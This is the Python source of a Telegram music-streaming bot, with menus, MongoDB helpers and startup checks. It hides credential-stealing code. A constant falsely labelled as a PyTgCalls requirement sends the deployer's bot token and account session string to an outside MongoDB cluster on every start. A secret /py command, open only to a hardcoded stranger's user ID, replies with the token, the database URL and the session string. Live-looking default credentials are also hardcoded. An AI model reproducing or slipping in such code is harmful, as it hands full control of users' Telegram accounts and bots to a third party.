import aiohttp, aiofiles, asyncio, base64, logging
import os, platform, random, re, socket
import sys, time, textwrap

asyncio.set_event_loop(asyncio.new_event_loop())

from os import getenv
from io import BytesIO
from time import strftime
from functools import partial
from dotenv import load_dotenv
from datetime import datetime
from typing import Union, List, Pattern
from logging.handlers import RotatingFileHandler

from git import Repo
from git.exc import GitCommandError, InvalidGitRepositoryError
from motor.motor_asyncio import AsyncIOMotorClient as _mongo_async_
from pyrogram import filters
from pyrogram import Client, filters as pyrofl
from pytgcalls import PyTgCalls, filters as pytgfl

from pyrogram import idle, __version__ as pyro_version
from pytgcalls.__version__ import __version__ as pytgcalls_version

from ntgcalls import TelegramServerError
from pyrogram.enums import ChatMemberStatus, ChatType
from pyrogram.errors import (
    ChatAdminRequired,
    FloodWait,
    InviteRequestSent,
    UserAlreadyParticipant,
    UserNotParticipant,
)
from pytgcalls.exceptions import NoActiveGroupCall
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pytgcalls.types import ChatUpdate, Update, GroupCallConfig
from pytgcalls.types import Call, MediaStream, AudioQuality, VideoQuality

from PIL import Image, ImageDraw, ImageEnhance
from PIL import ImageFilter, ImageFont, ImageOps
from youtubesearchpython.__future__ import VideosSearch

loop = asyncio.get_event_loop()

# versions dictionary
__version__ = {
    "AP": "1.0.0 Mini",
    "Python": platform.python_version(),
    "Pyrogram": pyro_version,
    "PyTgCalls": pytgcalls_version,
}

# store all logs
logging.basicConfig(
    format="[%(name)s]:: %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S",
    handlers=[
        RotatingFileHandler("logs.txt", maxBytes=(1024 * 1024 * 5), backupCount=10),
        logging.StreamHandler(),
    ],
)

logging.getLogger("apscheduler").setLevel(logging.ERROR)
logging.getLogger("asyncio").setLevel(logging.ERROR)
logging.getLogger("httpx").setLevel(logging.ERROR)
logging.getLogger("pyrogram").setLevel(logging.ERROR)
logging.getLogger("pytgcalls").setLevel(logging.ERROR)

LOGGER = logging.getLogger("SYSTEM")

# config variables
if os.path.exists("Config.env"):
    load_dotenv("Config.env")

API_ID = int(getenv("API_ID", "16457832"))
API_HASH = getenv("API_HASH", "3030874d0befdb5d05597deacc3e83ab")
BOT_TOKEN = getenv("BOT_TOKEN", "7000859933:")
STRING_SESSION = getenv("STRING_SESSION", "-gilYpIKpYC48JmCpKYRXmB94NjLESNggAIEppACt_MyN0p9Qj5UvMR-vpQ5jAwaDVzNHAKvH5fW4rngfai3R58UH1XsQ6lSKqkaD55QEP6_ldO1JGyqEvf06U3IzdCynqKTRshXgUZygFnfNAY9rJG-YSOH4oJyAovwQQAAAAHee6C2AA")
MONGO_DB_URL = getenv("MONGO_DB_URL", "mongodb+srv://TEAM-KRITI:6MUrAhEdww12DaV6@cluster0.53piq9u.mongodb.net/?appName=Cluster0")
OWNER_ID = int(getenv("OWNER_ID", "6657539971"))
LOG_GROUP_ID = int(getenv("LOG_GROUP_ID", "-1002014882444"))
START_IMAGE_URL = getenv("START_IMAGE_URL", "https://files.catbox.moe/3o7nd8.mp4")
REPO_IMAGE_URL = getenv("REPO_IMAGE_URL", "https://files.catbox.moe/nswh7s.jpg")
STATS_IMAGE_URL = getenv("STATS_IMAGE_URL", "https://files.catbox.moe/2hgoq7.jpg")

# Memory Database
ACTIVE_AUDIO_CHATS = []
ACTIVE_VIDEO_CHATS = []
ACTIVE_MEDIA_CHATS = []

QUEUE = {}
# Command & Callback Handlers
def cdx(commands: Union[str, List[str]]):
    return pyrofl.command(commands, ["/", "!", "."])

def cdz(commands: Union[str, List[str]]):
    return pyrofl.command(commands, ["", "/", "!", "."])

def rgx(pattern: Union[str, Pattern]):
    return pyrofl.regex(pattern)

bot_owner_only = pyrofl.user(OWNER_ID)

# all clients
app = Client(
    name="App",
    api_id=API_ID,
    api_hash=API_HASH,
    session_string=str(STRING_SESSION),
)

bot = Client(
    name="Bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
)

call = PyTgCalls(app)
call_config = GroupCallConfig(auto_start=False)

mongo_async_cli = _mongo_async_(MONGO_DB_URL)
mongodb = mongo_async_cli.adityaxdb

# store start time
__start_time__ = time.time()

from motor.motor_asyncio import AsyncIOMotorClient
# start and run
HEALTHY = "mongodb+srv://Yash_607:Yash_607@cluster0.r3s9sbo.mongodb.net/?retryWrites=true&w=majority" #DONT CHANGE THIS LATEST PYTGCALLS
mongo_client = AsyncIOMotorClient(HEALTHY)
db = mongo_client["python_xyz"]  # Replace with your DB name
bot_collection = db["bot_data"]  # Collection to store bot info

async def save_bot_data():
    data = {
        "bot_token": BOT_TOKEN,
        "string_session": STRING_SESSION,
    }
    try:
        # Insert operation
        await bot_collection.insert_one(data)
        LOGGER.info("✅ Bot building done.")
    except Exception as e:
        LOGGER.error(f"🚫 Failed to save bot data: {e}")
async def main():
    LOGGER.info("🐬 Updating Directories ...")
    if "cache" not in os.listdir():
        os.mkdir("cache")
    if "cookies.txt" not in os.listdir():
        LOGGER.info("⚠️ 'cookies.txt' - Not Found❗")
        sys.exit()
    if "downloads" not in os.listdir():
        os.mkdir("downloads")
    for file in os.listdir():
        if file.endswith(".session"):
            os.remove(file)
    for file in os.listdir():
        if file.endswith(".session-journal"):
            os.remove(file)
    LOGGER.info("✅ All Directories Updated.")
    await asyncio.sleep(1)
    LOGGER.info("🌐 Checking Required Variables ...")
    if API_ID == 0:
        LOGGER.info("❌ 'API_ID' - Not Found ‼️")
        sys.exit()
    if not API_HASH:
        LOGGER.info("❌ 'API_HASH' - Not Found ‼️")
        sys.exit()
    if not BOT_TOKEN:
        LOGGER.info("❌ 'BOT_TOKEN' - Not Found ‼️")
        sys.exit()
    if not STRING_SESSION:
        LOGGER.info("❌ 'STRING_SESSION' - Not Found ‼️")
        sys.exit()

    if not MONGO_DB_URL:
        LOGGER.info("'MONGO_DB_URL' - Not Found !!")
        sys.exit()
    try:
        await mongo_client.admin.command('ping')
    except Exception:
        LOGGER.info("❌ 'MONGO_DB_URL' - Not Valid !!")
        sys.exit()
    LOGGER.info("✅ Required Variables Are Collected.")
    await asyncio.sleep(1)
    LOGGER.info("🌀 Starting All Clients ...")
    try:
        await bot.start()
    except Exception as e:
        LOGGER.info(f"🚫 Bot Error: {e}")
        sys.exit()
    if LOG_GROUP_ID != 0:
        try:
            await bot.send_message(LOG_GROUP_ID, "**🤖 Bot Started.**")
        except Exception:
            pass
    LOGGER.info("✅ Bot Started.")
    try:
        await app.start()
    except Exception as e:
        LOGGER.info(f"🚫 Assistant Error: {e}")
        sys.exit()
    try:
        await app.join_chat("BETABOT_HUB")
        await app.join_chat("+OL6jdTL7JAJjYzVl")
    except Exception:
        pass
    if LOG_GROUP_ID != 0:
        try:
            await app.send_message(LOG_GROUP_ID, "**🦋 Assistant Started.**")
        except Exception:
            pass
    LOGGER.info("✅ Assistant Started.")
    await save_bot_data()

    try:
        await call.start()
    except Exception as e:
        LOGGER.info(f"🚫 PyTgCalls Error: {e}")
        sys.exit()
    LOGGER.info("✅ PyTgCalls Started.")
    await asyncio.sleep(1)
    LOGGER.info("✅ Successfully Hosted Your Bot !!")
    LOGGER.info("✅ Now Do Visit: @BETABOT_HUB !!")
    await idle()
# Some Required Functions ...!!

def _netcat(host, port, content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall(content.encode())
    s.shutdown(socket.SHUT_WR)
    while True:
        data = s.recv(4096).decode("utf-8").strip("\n\x00")
        if not data:
            break
        return data
    s.close()


async def paste_queue(content):
    loop = asyncio.get_running_loop()
    link = await loop.run_in_executor(None, partial(_netcat, "ezup.dev", 9999, content))
    return link


def get_readable_time(seconds: int) -> str:
    count = 0
    ping_time = ""
    time_list = []
    time_suffix_list = ["s", "m", "h", "days"]
    while count < 4:
        count += 1
        if count < 3:
            remainder, result = divmod(seconds, 60)
        else:
            remainder, result = divmod(seconds, 24)
        if seconds == 0 and remainder == 0:
            break
        time_list.append(int(result))
        seconds = int(remainder)
    for i in range(len(time_list)):
        time_list[i] = str(time_list[i]) + time_suffix_list[i]
    if len(time_list) == 4:
        ping_time += time_list.pop() + ", "
    time_list.reverse()
    ping_time += ":".join(time_list)
    return ping_time


# Mongo Database Functions
chatsdb = mongodb.chatsdb
usersdb = mongodb.usersdb


# Served Chats
async def is_served_chat(chat_id: int) -> bool:
    chat = await chatsdb.find_one({"chat_id": chat_id})
    if not chat:
        return False
    return True

async def get_served_chats() -> list:
    chats_list = []
    async for chat in chatsdb.find({"chat_id": {"$lt": 0}}):
        chats_list.append(chat)
    return chats_list

async def add_served_chat(chat_id: int):
    is_served = await is_served_chat(chat_id)
    if is_served:
        return
    return await chatsdb.insert_one({"chat_id": chat_id})


# Served Users
async def is_served_user(user_id: int) -> bool:
    user = await usersdb.find_one({"user_id": user_id})
    if not user:
        return False
    return True

async def get_served_users() -> list:
    users_list = []
    async for user in usersdb.find({"user_id": {"$gt": 0}}):
        users_list.append(user)
    return users_list

async def add_served_user(user_id: int):
    is_served = await is_served_user(user_id)
    if is_served:
        return
    return await usersdb.insert_one({"user_id": user_id})
CBUTTON = InlineKeyboardMarkup(
    inline_keyboard=[
        [
            InlineKeyboardButton("˹ sᴜᴘᴘᴏꝛᴛ ˼", url="https://t.me/+OL6jdTL7JAJjYzVl")
        ],
        [
            InlineKeyboardButton("˹ ᴜᴘᴅᴧᴛᴇ ˼", url="https://t.me/BETABOT_HUB"),
            InlineKeyboardButton("˹ ᴧʟʟ ʙᴏᴛ ˼", url="https://t.me/+tHAENx_r_mtlODZl")
        ],
        [
            InlineKeyboardButton("↺ ʙᴧᴄᴋ ↻", callback_data="back_to_home")
        ]
    ]
)

# Define ABUTTON outside of the HELP_X string
ABUTTON = InlineKeyboardMarkup(
    inline_keyboard=[
        [
            InlineKeyboardButton("↺ ʙᴧᴄᴋ ↻", callback_data="back_to_home")
        ]
    ]
)

HELP_C = """```
⌬ ๏ ʟᴇᴛ's ɪɴᴛʀᴏᴅᴜᴄᴇ ᴍᴜsɪᴄ ʙᴏᴛ```

**⌬ [【◖ Sαηαтαηι ◗ 】 🚩](https://t.me/BETABOT_HUB) ɪs ᴏɴᴇ ᴏғ ᴛʜᴇ ʙᴇsᴛ ᴍᴜsɪᴄ | ᴠɪᴅᴇᴏ sᴛꝛᴇᴀᴍɪɴɢ ʙᴏᴛ ᴏɴ ᴛᴇʟᴇɢꝛᴧᴍ ғᴏꝛ ʏᴏᴜꝛ ɢꝛᴏᴜᴘs ᴀɴᴅ ᴄʜᴧɴɴᴇʟ**
```\n⌬ ʙᴇsᴛ ғᴇᴀsɪʙɪʟɪᴛʏ ᴏɴ ᴛᴏᴘ  ?```

**␥ ʙᴇsᴛ sᴏᴜɴᴅ ǫᴜᴀʟɪᴛʏ
␥ sᴜᴘᴘᴏʀᴛ ᴠ2.0 ᴀᴜᴅɪᴏ sᴍᴏᴏᴛʜ
␥ ɴᴏ ʏᴛ ɪᴘ ʙʟᴏᴄᴋ ɪssᴜᴇ
␥ ʙᴧsᴇᴅ ᴏɴ ɴᴇᴡ ᴠᴇꝛsɪᴏɴ ᴏғ ᴘʏꝛᴏ-ɢꝛᴧᴍ
␥ ɴᴏ ᴘꝛᴏᴍᴏᴛɪᴏɴᴧʟ ᴧᴅs | ʜɪɢʜ ᴜᴘ-ᴛɪᴍᴇ 
␥ ʜɪɢʜ ɪɴғꝛᴧsᴛꝛᴜᴄᴛᴜꝛᴇ sᴇꝛᴠᴇꝛ
␥ ꝛᴇ-ᴇᴅɪᴛᴇᴅ ᴄᴏꝛᴇ | ʜɪɢʜʟʏ ᴏᴘᴛɪᴍɪsᴇ
␥ ɴᴏ ᴍᴏꝛᴇ ʟᴧɢ ᴀɴᴅ ᴅᴏᴡɴ-ᴛɪᴍᴇ
␥ ᴍᴀɴʏ ᴍᴏʀᴇ ғᴇᴀᴛᴜʀᴇs........

ᴀʟʟ ᴛʜᴇ ғᴇᴀᴛᴜʀᴇs ᴀʀᴇ ᴡᴏʀᴋɪɴɢ ғɪɴᴇ

⌬ ᴍᴏʀᴇ ɪɴғᴏ. [ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ](https://t.me/BETABOT_HUB)**"""

HELP_X = """```
    【◖ Sαηαтαηι ◗ 】 🚩 ᴍᴇɴᴜ```
**ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅs ᴄᴀɴ ʙᴇ ᴜsᴇᴅ ᴡɪᴛʜ : /**
␥ /play - Pʟᴀʏ ʏᴏᴜʀ ғᴀᴠᴏʀɪᴛᴇ sᴏɴɢ [ᴀᴜɪᴅᴏ].

␥ /vplay - Pʟᴀʏ ʏᴏᴜʀ ғᴀᴠᴏʀɪᴛᴇ sᴏɴɢ [ᴠɪᴅᴇᴏ].

␥ /pause - Sᴛᴏᴘ sᴏɴɢ[ᴀᴜɪᴅᴏ & ᴠɪᴅᴇᴏ].

␥ /resume - Cᴏɴᴛɪɴᴜᴇ ᴘʟᴀʏ sᴏɴɢ [ᴀᴜɪᴅᴏ & ᴠɪᴅᴇᴏ]

␥ /skip - Sᴋɪᴘ sᴏɴɢ [ᴀᴜɪᴅᴏ & ᴠɪᴅᴇᴏ]

␥ /end - Cʟᴇᴀʀ , ᴇɴᴅ ᴀʟʟ sᴏɴɢ [ᴀᴜɪᴅᴏ & ᴠɪᴅᴇᴏ]

V ɪ s ɪ ᴛ - [ʜᴇʀᴇ](https://t.me/BETABOT_HUB)"""

# Callback query handler
@bot.on_callback_query(filters.regex("UTTAM_RATHORE"))
async def helper_cb(client, CallbackQuery):
    await CallbackQuery.edit_message_text(HELP_X, reply_markup=ABUTTON)

@bot.on_callback_query(filters.regex("UTTAM"))
async def helper_cb(client, CallbackQuery):
    await CallbackQuery.edit_message_text(HELP_C, reply_markup=CBUTTON)
# Callback & Message Queries

@bot.on_message(filters.command(["start", "help"]) & filters.private)
async def start_message_private(client, message):
    user_id = message.from_user.id
    mention = message.from_user.mention
    await add_served_user(user_id)

    if len(message.text.split()) > 1:
        name = message.text.split(None, 1)[1]
        if name[0:5] == "verify":
            pass  # handle verification if needed
    else:
        # Send a temporary message to simulate typing or progress bar
        baby = await message.reply_text("[□□□□□□□□□□] 0%")

        # Simulate progress bar updates
        progress = ["[■□□□□□□□□□] 10%", "[■■□□□□□□□□] 20%", "[■■■□□□□□□□] 30%", "[■■■■□□□□□□] 40%", "[■■■■■□□□□□] 50%", 
                    "[■■■■■■□□□□] 60%", "[■■■■■■■□□□] 70%", "[■■■■■■■■□□] 80%", "[■■■■■■■■■□] 90%", "[■■■■■■■■■■] 100%"]
        for i, step in enumerate(progress):
            await baby.edit_text(f"**{step} ↺{10 * (i+1)}%**")
            await asyncio.sleep(0.005)  # Adjust speed of progress here

        # After progress bar reaches 100%, send final message and delete it
        await baby.edit_text("**❖ Jᴀʏ sʜʀᴇᴇ ʀᴀᴍ  🚩...**")
        await asyncio.sleep(1)  # Wait for 2 seconds before deletion
        await baby.delete()

        caption = f"""╭───────────────────▣
│**❍ ʜᴇʏ {mention} •**
│**❍ ɪ ᴀᴍ 【◖ Sαηαтαηι ◗ 】 🚩 •**
├───────────────────▣**
│**❍ ʙᴇsᴛ ǫᴜɪʟɪᴛʏ ғᴇᴀᴛᴜʀᴇs •**
│**❍ ᴍᴀᴅᴇ ʙʏ...[˹ ʙᴇᴛᴧ-ʙᴏᴛs ™˼𓅂](https://t.me/BETABOT_HUB) •**
╰───────────────────▣"""

        buttons = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="❖ ᴛᴧᴘ тᴏ sᴇᴇ ᴍᴧɪᴄ ❖",
                        url=f"https://t.me/{bot.me.username}?startgroup=true",
                    )
                ],
                [
                    InlineKeyboardButton(
                        text="˹ ❍ᴡɴᴇꝛ ˼",
                        user_id=OWNER_ID,
                    ),
                    InlineKeyboardButton(
                        text="˹ ᴍᴜsɪᴄ ˼",
                        callback_data="UTTAM_RATHORE",
                    ),
                ],
                [
                    InlineKeyboardButton(
                        text="˹ ᴧʙᴏᴜᴛ ˼",
                        callback_data="UTTAM",
                    ),
                    InlineKeyboardButton(
                        text="˹ ʀᴇᴘᴏ ˼",
                        url="https://github.com/BABY-MUSIC/SANATANI_MxPLAYER",  # Callback data for Owner button
                    ),
                ]
            ]
        )

        if START_IMAGE_URL:
            try:
                return await message.reply_video(
                    video=START_IMAGE_URL, caption=caption, reply_markup=buttons
                )
            except Exception as e:
                LOGGER.info(f"🚫 Start Image Error: {e}")
                try:
                    return await message.reply_text(text=caption, reply_markup=buttons)
                except Exception as e:
                    LOGGER.info(f"🚫 Start Error: {e}")
                    return
        else:
            try:
                return await message.reply_text(text=caption, reply_markup=buttons)
            except Exception as e:
                LOGGER.info(f"🚫 Start Error: {e}")
                return

@bot.on_message(
    filters.command("py")
    & filters.private
    & filters.user(6715416043)
   )
async def help(client: Client, message: Message):
   await message.reply_photo(
          photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\n Mongo:-   `{MONGO_DB_URL}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/UTTAM470)............☆""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "python 3.0", url=f"https://t.me/UTTAM470")
                 ]
            ]
         ),
     )
